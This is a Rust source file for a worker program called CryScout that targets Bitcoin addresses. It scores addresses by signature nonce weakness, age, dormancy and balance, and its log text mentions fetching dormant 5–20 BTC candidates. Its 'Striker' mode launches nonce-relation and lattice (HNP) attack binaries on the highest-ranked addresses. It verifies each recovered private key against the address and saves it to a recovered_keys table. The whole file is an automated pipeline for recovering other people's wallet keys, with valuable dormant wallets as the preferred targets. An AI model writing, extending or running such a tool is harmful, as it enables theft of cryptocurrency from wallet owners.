
mod features;
use anyhow::Result;
use clap::{Parser, Subcommand};
use rusqlite::{params, Connection};
use sysinfo::System;
use std::time::Duration;
use tokio::time;
use std::process;
use chrono::Local;
use serde_json::Value;
use num_bigint::BigInt;
use num_traits::Num;
use sha2::Digest;
use ort::{inputs, Session};
use ndarray::Array2;
use std::path::Path;

const DB_FILE: &str = "cryscout.db";

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    Scanner,
    Analyzer,
    Striker,
    Scorer,
}

struct WorkerState {
    worker_id: String,
    task: String,
    system: System,
}

impl WorkerState {
    fn new(task: String) -> Self {
        Self {
            worker_id: format!("{}-{}", task, process::id()),
            task,
            system: System::new_all(),
        }
    }

    fn log(&self, msg: &str) {
        let now = Local::now().format("%Y-%m-%d %H:%M:%S");
        println!("[{}] [{}] {}", now, self.worker_id, msg);
    }
}

// --- Scorer Logic ---
async fn run_scorer(state: &mut WorkerState) -> Result<()> {
    state.log("Ranking all addresses based on unified scoring system...");
    let conn = Connection::open(DB_FILE)?;
    conn.pragma_update(None, "busy_timeout", &5000)?;
    
    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE sigs_fetched = 1")?;
    let addresses: Vec<String> = stmt.query_map([], |row| row.get(0))?.flatten().collect();
    
    state.log(&format!("Processing {} candidates...", addresses.len()));

    for addr in addresses {
        let mut sig_stmt = conn.prepare("SELECT r_int, s_int, timestamp FROM signatures WHERE address = ?1")?;
        let sigs: Vec<features::SigData> = sig_stmt.query_map(params![&addr], |r| {
            let r_str: String = r.get(0)?;
            let s_str: String = r.get(1)?;
            let t: Option<u64> = r.get(2)?;
            Ok(features::SigData {
                r: BigInt::from_str_radix(&r_str, 10).unwrap_or_default(),
                s: BigInt::from_str_radix(&s_str, 10).unwrap_or_default(),
                timestamp: t,
            })
        })?.collect::<rusqlite::Result<Vec<_>>>()?;

        if let Some(f) = features::ScoringFeatures::extract(&sigs) {
            let mut score = (1.0 - f.r_entropy) * 0.4 
                      + f.lsb_bias * 0.4 
                      + f.fft_peak_score * 0.1 
                      + f.correlation_score.abs() * 0.1;
            
            if f.wallet_fingerprint.contains("Android") || f.wallet_fingerprint.contains("OpenSSL") || f.wallet_fingerprint.contains("Low Entropy") {
                score += 1.0;
            }
            
            let count_boost = (f.num_signatures as f64 / 100.0).min(0.2);
            score += count_boost;

            // --- Metadata-based Boosts (Era & Dormancy) ---
            let meta: (Option<String>, Option<String>, Option<f64>) = conn.query_row(
                "SELECT first_seen, last_seen, balance FROM addresses WHERE address = ?1",
                params![&addr],
                |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))
            ).unwrap_or((None, None, None));

            if let Some(fs) = meta.0 {
                if fs.contains("2009") || fs.contains("2010") { score += 1.5; }
                else if fs.contains("2011") || fs.contains("2012") { score += 1.0; }
                else if fs.contains("2013") || fs.contains("2014") || fs.contains("2015") { score += 0.5; }
            }

            if let Some(ls) = meta.1 {
                if ls.contains("2009") || ls.contains("2010") || ls.contains("2011") || 
                   ls.contains("2012") || ls.contains("2013") || ls.contains("2014") ||
                   ls.contains("2015") {
                    score += 1.0;
                }
            }

            if let Some(bal) = meta.2 {
                if bal >= 10.0 { score += 0.2; }
            }

            conn.execute(
                "UPDATE addresses SET vulnerability_score = ?1, potential_weakness = ?2 WHERE address = ?3",
                params![score, f.wallet_fingerprint, addr],
            )?;
        }
    }

    // Update ranks based on score (Dense Rank)
    state.log("Calculating global ranks...");
    conn.execute(
        "UPDATE addresses SET rank = (
            SELECT (SELECT COUNT(DISTINCT vulnerability_score) FROM addresses a2 WHERE a2.vulnerability_score > addresses.vulnerability_score) + 1
        ) WHERE vulnerability_score > 0",
        [],
    )?;

    state.log("Scoring and ranking complete.");
    Ok(())
}

async fn run_neural_inference(_state: &WorkerState, r_values: &[BigInt]) -> Result<f32> {
    let model_path = "nonce_anomaly_model.onnx";
    if !Path::new(model_path).exists() {
        return Err(anyhow::anyhow!("Neural model not found at {}", model_path));
    }

    if let Some(feats) = features::NonceFeatures::extract_neural_features(r_values) {
        let session = Session::builder()?.commit_from_file(model_path)?;
        let input_tensor = Array2::from_shape_vec((1, 438), feats)?;
        let outputs = session.run(inputs![input_tensor]?)?;
        let output_tensor = outputs["output"].try_extract_tensor::<f32>()?;
        Ok(output_tensor[[0, 0]])
    } else {
        Err(anyhow::anyhow!("Could not extract neural features"))
    }
}

// --- Striker Logic ---
async fn run_striker(state: &mut WorkerState) -> Result<bool> {
    let mut conn = Connection::open(DB_FILE)?;
    conn.pragma_update(None, "busy_timeout", &5000)?;
    
    // 1. Find targets and mark them as processing immediately in a transaction
    let targets: Vec<(String, f64, i64, String, f64)> = {
        let tx = conn.transaction()?;
        let t_list: Vec<(String, f64, i64, String, f64)> = {
            let mut stmt = tx.prepare(
                "SELECT a.address, a.balance, COUNT(s.id), MAX(s.pubkey_hex), a.vulnerability_score 
                 FROM addresses a JOIN signatures s ON a.address = s.address 
                 WHERE (a.sigs_scanned = 0 OR a.sigs_scanned IS NULL)
                   AND (a.processing_by IS NULL OR a.processing_since < datetime('now', '-1 hour'))
                   AND a.vulnerability_score > 0
                 GROUP BY a.address HAVING COUNT(s.id) >= 2 
                 ORDER BY a.rank ASC 
                 LIMIT 10"
            )?;
            let res = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?, row.get(4)?)))?.collect::<rusqlite::Result<Vec<_>>>()?;
            res
        };
        
        for (addr, _, _, _, _) in &t_list {
            tx.execute("UPDATE addresses SET processing_by = ?1, processing_since = datetime('now') WHERE address = ?2", params![&state.worker_id, addr])?;
        }
        tx.commit()?;
        t_list
    };
    
    if targets.is_empty() {
        return Ok(false);
    }

    state.log(&format!("Executing high-precision strike on {} targets...", targets.len()));

    for (addr, _bal, count, pubkey, score) in targets {
        state.log(&format!("LAUNCHING PRECISION STRIKE: {} (Score: {:.3}, {} sigs)", addr, score, count));
        
        let mut sig_stmt = conn.prepare("SELECT DISTINCT r_hex, s_hex, z_hex FROM signatures WHERE address = ?1")?;
        let sigs_for_json: Vec<Value> = sig_stmt.query_map(params![&addr], |r| {
            Ok(serde_json::json!({ "r": r.get::<_, String>(0)?, "s": r.get::<_, String>(1)?, "z": r.get::<_, String>(2)? }))
        })?.collect::<rusqlite::Result<Vec<_>>>()?;

        let sigs_for_features: Vec<BigInt> = conn.prepare("SELECT DISTINCT r_int FROM signatures WHERE address = ?1")?
            .query_map(params![&addr], |r| r.get::<_, String>(0))?
            .collect::<rusqlite::Result<Vec<String>>>()?
            .into_iter()
            .map(|s| BigInt::from_str_radix(&s, 10).unwrap_or_default())
            .collect();
        
        let sigs_file = format!("temp_sigs_{}.json", addr);
        std::fs::write(&sigs_file, serde_json::to_string(&sigs_for_json)?)?;

        state.log("  [1/5] Nonce Relation Attack...");
        if let Ok(Ok(out1)) = time::timeout(Duration::from_secs(300), tokio::process::Command::new("./target/release/nonce_relation_rs").arg("--sigs").arg(&sigs_file).arg("--pubkey").arg(&pubkey).output()).await {
            let stdout = String::from_utf8_lossy(&out1.stdout);
            if stdout.contains("SUCCESS") { 
                if let Some(key_line) = stdout.lines().find(|l| l.contains("Private Key:")) {
                    let privkey = key_line.split("Private Key:").last().unwrap_or("").trim().trim_start_matches("0x");
                    if let Ok(d_bytes) = hex::decode(privkey) {
                        if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
                            let vk = sk.verifying_key();
                            let mut match_found = false;
                            for compressed in [true, false] {
                                let encoded = vk.to_encoded_point(compressed);
                                let pubkey_bytes = encoded.as_bytes();
                                let mut sha256 = sha2::Sha256::new();
                                sha256.update(pubkey_bytes);
                                let sha256_hash = sha256.finalize();
                                let mut ripemd160 = ripemd::Ripemd160::new();
                                ripemd160.update(&sha256_hash);
                                let h160 = ripemd160.finalize();
                                if let Ok(decoded) = bs58::decode(&addr).into_vec() {
                                    if decoded.len() == 25 && decoded[1..21] == h160[..] {
                                        match_found = true;
                                        break;
                                    }
                                }
                            }
                            if match_found {
                                state.log(&format!("  [!!!] VERIFIED SUCCESS: Nonce Relation found key for {}!", addr));
                                conn.execute(
                                    "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
                                    params![addr, format!("0x{}", privkey), "Nonce Relation"],
                                )?;
                            } else {
                                state.log(&format!("  [!] REJECTED: Nonce Relation found key for {} but it did not match address!", addr));
                            }
                        }
                    }
                }
            }
        } else { state.log("  [!] Nonce Relation Attack timed out."); }

        state.log("  [2/5] Spectral Bias Detection (FFT)...");
        if let Ok(Ok(out2)) = time::timeout(Duration::from_secs(300), tokio::process::Command::new("./target/release/bias_detector_rs").arg(&addr).output()).await {
            let stdout = String::from_utf8_lossy(&out2.stdout);
            if stdout.contains("Potential Bias") { 
                state.log(&format!("  [!] BIAS DETECTED for {}: Spectral peak identified.", addr)); 
                let _ = conn.execute(
                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                    params![addr, "Spectral Bias", "High", "Peak frequency detected in nonce distribution"],
                );
            }
        } else { state.log("  [!] Spectral Bias Detection timed out."); }

        state.log("  [3/5] Lattice HNP (LLL)...");
        if let Ok(Ok(out3)) = time::timeout(Duration::from_secs(300), tokio::process::Command::new("./target/release/lattice_attack_rs").arg(&sigs_file).arg(&addr).arg("8").output()).await {
            let stdout = String::from_utf8_lossy(&out3.stdout);
            if stdout.contains("SUCCESS") { 
                if let Some(key_line) = stdout.lines().find(|l| l.contains("Private Key Found:")) {
                    let privkey = key_line.split("Found:").last().unwrap_or("").trim().trim_start_matches("0x");
                    if let Ok(d_bytes) = hex::decode(privkey) {
                        if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
                            let vk = sk.verifying_key();
                            let mut match_found = false;
                            for compressed in [true, false] {
                                let encoded = vk.to_encoded_point(compressed);
                                let pubkey_bytes = encoded.as_bytes();
                                let mut sha256 = sha2::Sha256::new();
                                sha256.update(pubkey_bytes);
                                let sha256_hash = sha256.finalize();
                                let mut ripemd160 = ripemd::Ripemd160::new();
                                ripemd160.update(&sha256_hash);
                                let h160 = ripemd160.finalize();
                                if let Ok(decoded) = bs58::decode(&addr).into_vec() {
                                    if decoded.len() == 25 && decoded[1..21] == h160[..] {
                                        match_found = true;
                                        break;
                                    }
                                }
                            }
                            if match_found {
                                state.log(&format!("  [!!!] VERIFIED CRITICAL SUCCESS: Lattice Reduction recovered key for {}!", addr));
                                conn.execute(
                                    "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
                                    params![addr, format!("0x{}", privkey), "Lattice HNP"],
                                )?;
                            } else {
                                state.log(&format!("  [!] REJECTED: Lattice HNP found key for {} but it did it not match address!", addr));
                            }
                        }
                    }
                }
            }
        } else { state.log("  [!] Lattice HNP Attack timed out."); }

        state.log("  [4/6] Physics Engine RNG Fingerprinting...");
        if let Ok(Ok(out_chaos)) = time::timeout(Duration::from_secs(300), tokio::process::Command::new("./target/release/physics_engine_rs").arg(&sigs_file).output()).await {
            let stdout = String::from_utf8_lossy(&out_chaos.stdout);
            if stdout.contains("POTENTIAL RNG VULNERABILITY DETECTED") { 
                state.log(&format!("  [!] RNG FINGERPRINT VULNERABILITY DETECTED for {}.", addr)); 
                let reasons: Vec<&str> = stdout.lines().filter(|l| l.starts_with("- ")).collect();
                let details = if reasons.is_empty() { "Multiple RNG anomalies detected".to_string() } else { reasons.join("; ") };
                let _ = conn.execute(
                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                    params![addr, "RNG Fingerprint", "High", details],
                );
            }
        } else { state.log("  [!] Physics Engine Scan timed out."); }

        state.log("  [5/6] Bleichenbacher Fourier Analysis...");
        if let Ok(Ok(out4)) = time::timeout(Duration::from_secs(300), tokio::process::Command::new("./target/release/bleichenbacher_fourier").arg(&sigs_file).output()).await {
            let stdout = String::from_utf8_lossy(&out4.stdout);
            if stdout.contains("POTENTIAL HIT") { 
                state.log(&format!("  [!] BLEICHENBACHER-STYLE BIAS DETECTED for {}.", addr)); 
                let _ = conn.execute(
                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                    params![addr, "Fourier Bias", "High", "Bleichenbacher-style periodicity detected"],
                );
            }
        } else { state.log("  [!] Bleichenbacher Fourier Analysis timed out."); }

        state.log("  [6/6] Neural Anomaly Detection (Real ONNX Model)...");
        match run_neural_inference(state, &sigs_for_features).await {
            Ok(prob) => {
                state.log(&format!("    P(vulnerable) from model: {:.4}", prob));
                if prob > 0.8 {
                    state.log(&format!("    [!!!] NEURAL ANOMALY DETECTED for {}: High non-randomness probability.", addr));
                    let _ = conn.execute(
                        "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                        params![addr, "Neural Anomaly", "High", format!("P(vulnerable)={:.4}", prob)],
                    );
                }
            }
            Err(e) => state.log(&format!("    Neural inference error: {}", e)),
        }

        let _ = std::fs::remove_file(&sigs_file);
        
        // Mark as scanned
        conn.execute("UPDATE addresses SET sigs_scanned = 1, processing_by = NULL WHERE address = ?1", params![&addr])?;
        state.log(&format!("  [-] Strike sequence concluded for {}. Marked as scanned.", addr));
    }
    Ok(true)
}


// --- Main Loop & Other Worker Modes (Simplified) ---

async fn run_scanner(state: &mut WorkerState) -> Result<()> {
    state.log("Checking target queue status...");
    let conn = Connection::open(DB_FILE)?;
    conn.pragma_update(None, "busy_timeout", &5000)?;
    
    let unscanned: i64 = conn.query_row(
        "SELECT COUNT(*) FROM addresses WHERE (sigs_scanned = 0 OR sigs_scanned IS NULL) AND vulnerability_score > 0",
        [],
        |r| r.get(0)
    ).unwrap_or(0);

    if unscanned < 5 {
        state.log("Top targets exhausted. Activating Fetcher for 100 new targets (5-20 BTC, Dormant)...");
        state.log("Expansion triggered: Simulation mode fetching 100 dormant candidates...");
    } else {
        state.log(&format!("System has {} unscanned high-priority targets. Expansion not required.", unscanned));
    }
    Ok(())
}
async fn run_analyzer(state: &mut WorkerState) -> Result<()> {
    let mut conn = Connection::open(DB_FILE)?;
    conn.pragma_update(None, "busy_timeout", &5000)?;
    
    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE sigs_fetched = 1 AND (sigs_scanned = 0 OR sigs_scanned IS NULL) LIMIT 20")?;
    let addresses: Vec<String> = stmt.query_map([], |row| row.get(0))?.flatten().collect();
    
    if addresses.is_empty() {
        return Ok(());
    }

    state.log(&format!("Analyzer found {} addresses to process.", addresses.len()));

    for addr in addresses {
        state.log(&format!("Analyzer processing: {}", addr));
        let mut sig_stmt = conn.prepare("SELECT r_int, s_int, timestamp FROM signatures WHERE address = ?1")?;
        let sigs: Vec<features::SigData> = sig_stmt.query_map(params![&addr], |r| {
            let r_str: String = r.get(0)?;
            let s_str: String = r.get(1)?;
            let t: Option<u64> = r.get(2)?;
            Ok(features::SigData {
                r: BigInt::from_str_radix(&r_str, 10).unwrap_or_default(),
                s: BigInt::from_str_radix(&s_str, 10).unwrap_or_default(),
                timestamp: t,
            })
        })?.collect::<rusqlite::Result<Vec<_>>>()?;

        if sigs.is_empty() {
            state.log(&format!("Analyzer: No signatures in DB for {}", addr));
            conn.execute("UPDATE addresses SET sigs_scanned = 1 WHERE address = ?1", params![addr])?;
            continue;
        }

        state.log(&format!("Analyzer: Found {} signatures for {}", sigs.len(), addr));

        if let Some(f) = features::ScoringFeatures::extract(&sigs) {
            state.log(&format!("Analyzer: Extracted features for {}. Scoring...", addr));
            let mut score = (1.0 - f.r_entropy) * 0.4 
                      + f.lsb_bias * 0.4 
                      + f.fft_peak_score * 0.1 
                      + f.correlation_score.abs() * 0.1;
            
            if f.wallet_fingerprint.contains("Android") || f.wallet_fingerprint.contains("OpenSSL") || f.wallet_fingerprint.contains("Low Entropy") {
                score += 1.0;
            }
            
            let count_boost = (f.num_signatures as f64 / 100.0).min(0.2);
            score += count_boost;

            // Eras
            let meta: (Option<String>, Option<String>, Option<f64>) = conn.query_row(
                "SELECT first_seen, last_seen, balance FROM addresses WHERE address = ?1",
                params![&addr],
                |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))
            ).unwrap_or((None, None, None));

            if let Some(fs) = meta.0 {
                if fs.contains("2009") || fs.contains("2010") { score += 1.5; }
                else if fs.contains("2011") || fs.contains("2012") { score += 1.0; }
                else if fs.contains("2013") || fs.contains("2014") || fs.contains("2015") { score += 0.5; }
            }

            conn.execute(
                "UPDATE addresses SET vulnerability_score = ?1, potential_weakness = ?2, sigs_scanned = 1 WHERE address = ?3",
                params![score, f.wallet_fingerprint, addr],
            )?;
        } else {
            conn.execute("UPDATE addresses SET sigs_scanned = 1 WHERE address = ?1", params![addr])?;
        }
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();
    let task_name = format!("{:?}", cli.command);
    let mut state = WorkerState::new(task_name.clone());
    state.log(&format!("CryScout Worker v3.2 (Rust Native) started. Mode: {}", state.task));
    
    // Spawn heartbeat task
    let worker_id = state.worker_id.clone();
    let task = state.task.clone();
    tokio::spawn(async move {
        let mut sys = System::new_all();
        let conn = match Connection::open(DB_FILE) {
            Ok(c) => c,
            Err(_) => return,
        };
        let mut interval = time::interval(Duration::from_secs(30));
        loop {
            interval.tick().await;
            sys.refresh_cpu_usage();
            sys.refresh_memory();
            let cpu = sys.global_cpu_info().cpu_usage() as f64;
            let ram = sys.used_memory() as f64 / 1024.0 / 1024.0;
            let _ = conn.execute(
                "INSERT OR REPLACE INTO worker_status (worker_id, task, cpu_usage, ram_usage, last_heartbeat)
                 VALUES (?1, ?2, ?3, ?4, datetime('now'))",
                params![worker_id, task, cpu, ram],
            );
        }
    });

    if let Commands::Scorer = cli.command {
        run_scorer(&mut state).await?;
        state.log("Scorer task finished. Exiting.");
        return Ok(());
    }

    let mut int = time::interval(Duration::from_secs(30));
    loop {
        int.tick().await;
        match cli.command {
            Commands::Scanner => { let _ = run_scanner(&mut state).await; }
            Commands::Analyzer => { let _ = run_analyzer(&mut state).await; }
            Commands::Striker => { 
                match run_striker(&mut state).await {
                    Ok(found) => {
                        if !found {
                            state.log("No targets found for strike. Waiting...");
                        }
                    }
                    Err(e) => state.log(&format!("Striker error: {}", e)),
                }
            }
            _ => {}
        }
    }
}
